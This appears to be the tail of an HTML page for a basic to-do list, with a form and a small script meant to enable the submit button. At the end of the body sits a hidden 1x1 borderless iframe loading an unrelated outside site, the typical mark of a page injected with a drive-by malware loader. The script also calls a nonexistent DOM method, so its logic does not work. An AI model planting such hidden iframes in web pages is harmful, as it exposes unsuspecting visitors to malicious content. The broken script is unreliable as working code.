        <script>
            function disbtn() {
                var s=document.getQuerySelector('#submit');
                if(txt.value != ''){
                    s.disabled = false;

                }
                else{
                   s.disabled = true;
                }
                
            }
        </script>
    </head>
    <body>
<h1>To Do List</h1>
<ul>
</ul>
<form>

        <input id="txt" placeholder="Add todo task" type="text" onkeyup="disbtn()">
        <input type="submit" id="submit" disabled>
    </form>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
